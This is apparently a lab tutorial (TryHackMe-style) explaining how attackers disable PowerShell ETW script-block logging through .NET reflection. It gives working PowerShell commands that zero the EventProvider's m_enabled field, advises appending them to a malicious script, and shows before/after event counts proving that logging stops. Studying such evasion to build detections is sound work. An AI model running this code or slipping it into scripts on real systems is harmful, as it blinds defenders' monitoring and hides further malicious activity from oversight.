# PowerShell ETW Evasion via Reflection

Within PowerShell, ETW (Event Tracing for Windows) providers are loaded into the session from a .NET assembly: `PSEtwLogProvider`.

> From the Microsoft docs:  
> *"Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."*

.NET assemblies may seem foreign, but they often take familiar forms such as `.exe` (executable) or `.dll` (dynamic-link library).

In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup. Since the session has the same privilege level as the loaded assemblies, we can modify the assembly fields and values through PowerShell reflection.

> From O'Reilly:  
> *"Reflection allows you to look inside an assembly and find out its characteristics. Inside a .NET assembly, information is stored that describes what the assembly contains. This is called metadata. A .NET assembly is, in a sense, self-describing, at least if interrogated correctly."*

## ETW Evasion Technique

In the context of ETW, an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.

### High-Level Steps

1. **Obtain .NET assembly for `PSEtwLogProvider`.**
2. **Store a null value for `etwProvider` field.**
3. **Set the field for `m_enabled` to a previously stored value.**

### Example PowerShell Commands

**Step 1:** Obtain the type for the `PSEtwLogProvider` assembly.

```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

**Step 2:** Store a value (`$null`) from the previous assembly to be used.

```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

**Step 3:** Overwrite the `m_enabled` field with the value stored in the previous line.

```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0)
```

You can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.

---

## Demonstration

To prove the efficacy of the script, execute it and measure the number of returned events from a given command.

### Before

```powershell
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
7
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
11
```

### After

```powershell
PS C:\Users\Administrator> .\reflection.ps1
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
```

In the first terminal, four events are generated when the `whoami` command is run. After executing the script, no new events are generated from running a command. Note that the PowerShell script itself creates seven events; this should be considered when evaluating this approach.